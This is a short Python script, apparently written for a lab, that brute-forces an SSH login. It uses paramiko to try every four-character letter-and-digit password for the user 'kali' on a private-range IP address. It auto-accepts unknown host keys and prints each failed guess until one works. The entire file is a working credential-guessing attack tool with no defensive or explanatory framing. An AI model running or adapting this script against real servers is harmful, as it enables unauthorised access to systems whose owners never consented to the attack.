import itertools as it
from utils import timefunc
import string
import paramiko


def create_client():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client


class Brutes:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip

    def crackit(self, username):
        for guess in self.guesses:
            client = create_client()
            try:
                client.connect(self.ip, username=username, password=guess, timeout=0.5)
                return guess
            except paramiko.AuthenticationException as e:
                print(f"{guess} is not it. {e}")
            finally:
                client.close()

    @property
    def guesses(self):
        for guess in it.product(self.charset, repeat=self.length):
            yield "".join(guess)


@timefunc
def main():
    ip = "192.168.100.99"
    charset = string.ascii_letters + string.digits
    username = "kali"
    brute = Brutes(charset=charset, length=4, ip=ip)
    password = brute.crackit(username=username)
    if password:
        print(f"Password Found: {password}")


if __name__ == "__main__":
    main()
